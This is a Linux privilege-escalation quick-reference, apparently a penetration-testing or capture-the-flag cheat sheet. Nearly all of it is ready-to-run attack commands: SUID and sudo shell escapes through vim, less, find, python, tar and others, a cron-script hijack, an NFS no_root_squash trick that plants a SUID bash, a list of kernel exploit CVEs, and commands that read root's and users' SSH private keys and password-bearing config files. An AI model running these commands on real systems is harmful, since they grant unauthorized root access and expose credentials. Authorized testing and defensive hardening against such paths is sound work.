# Linux Privilege-Escalation Quick-Reference

## Quick Enumeration Script

```bash
# LinPEAS-style enumeration
# 1. Check the current user and privileges
id; whoami; sudo -l

# 2. Check SUID files
find / -perm -4000 2>/dev/null

# 3. Check sudo-available commands
sudo -l

# 4. Check crontab
cat /etc/crontab
ls -la /etc/cron.d/

# 5. Check the network
netstat -tulpn
ss -tulpn

# 6. Check services
ps aux | grep root
systemctl list-units --type=service

# 7. Check writable directories
find / -writable -type d 2>/dev/null | grep -v proc

# 8. Check the kernel version
uname -a
cat /etc/issue

# 9. Check the sudo version (CVE)
sudo --version

# 10. Check the polkit version
pkexec --version
```

## Common Privilege-Escalation Paths

### 1. SUID Privilege Escalation

```bash
# Commonly exploitable SUID
nmap:        nmap --interactive; !sh
vim:         vim -c ':!/bin/sh'
less:        less /etc/passwd; !/bin/sh
more:        more /etc/passwd; !/bin/sh
awk:         awk 'BEGIN {system("/bin/sh")}'
find:        find . -exec /bin/sh -p \; -quit
python:      python -c 'import os; os.system("/bin/sh")'
perl:        perl -e 'exec "/bin/sh";'
ruby:        ruby -e 'exec "/bin/sh"'
bash:        bash -p
sh:          sh
```

### 2. Sudo Privilege Escalation

```bash
# sudo -l to view available commands
# Common commands usable for privilege escalation
sudo git help config; !/bin/sh
sudo less /etc/passwd; !/bin/sh
sudo vim; :!/bin/sh
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find . -exec /bin/sh -p \; -quit
sudo python -c 'import os; os.system("/bin/sh")'
sudo perl -e 'exec "/bin/sh"'
sudo ruby -e 'exec "/bin/sh"'
sudo lua -e 'os.execute("/bin/sh")'
```

### 3. Cron Privilege Escalation

```bash
# Check cron jobs
cat /etc/crontab
ls -la /etc/cron.d/
# If a cron job runs as root and is writable
# Modify the script to append a malicious command
```

### 4. NFS Privilege Escalation

```bash
# If /home has no_root_squash
# Mount from another machine
mount -t nfs target:/home /tmp/nfs
cp /bin/bash /tmp/nfs/bash_suid
chmod +s /tmp/nfs/bash_suid
# On the target, run /tmp/nfs/bash_suid -p
```

### 5. Kernel Exploits

```python
# Search for an available exploit
# Common vulnerabilities:
# - dirtycow (CVE-2016-5195)
# - docker breakout
# - overlayfs (CVE-2021-3493)
# - Polkit (CVE-2021-4034) / PwnKit
# - etc.
```

### 6. Password Reuse

```bash
# Check readable config files
cat /etc/mysql/my.cnf
cat /var/www/html/config.php
cat /home/*/.ssh/id_rsa
cat /root/.ssh/id_rsa
# If you find a password, try su root or ssh root@localhost
```

## Sensitive File Locations

```
/etc/passwd          # Writable on some systems
/etc/shadow          # Usually unreadable
/root/.ssh/          # root's SSH private key
/home/*/.ssh/       # Users' SSH private keys
/var/www/html/       # Web directory (may contain config)
/tmp/                # Writable directory (drop a payload)
/etc/cron.d/         # Cron configuration
/proc/self/environ   # Environment variables (may contain secrets)
/proc/self/fd/       # File descriptors (may leak info)
```

## GTFOBins (sudo/suid lookup table)

| Command | Privilege-escalation method |
|------|---------|
| `nmap` | `nmap --interactive` → `!sh` |
| `vim` | `:!/bin/sh` |
| `less` | `!/bin/sh` |
| `more` | `!/bin/sh` |
| `awk` | `awk 'BEGIN {system("/bin/sh")}'` |
| `find` | `find . -exec /bin/sh -p \; -quit` |
| `perl` | `perl -e 'exec "/bin/sh"'` |
| `python` | `python -c 'import os; os.system("/bin/sh")'` |
| `ruby` | `ruby -e 'exec "/bin/sh"'` |
| `git` | `git help config` → `!/bin/sh` |
| `tar` | `tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` |
| `zip` | `zip /tmp/test.zip /tmp/test -T -TT 'sh #'` |
| `awk` | `awk 'BEGIN {system("/bin/sh")}'` |
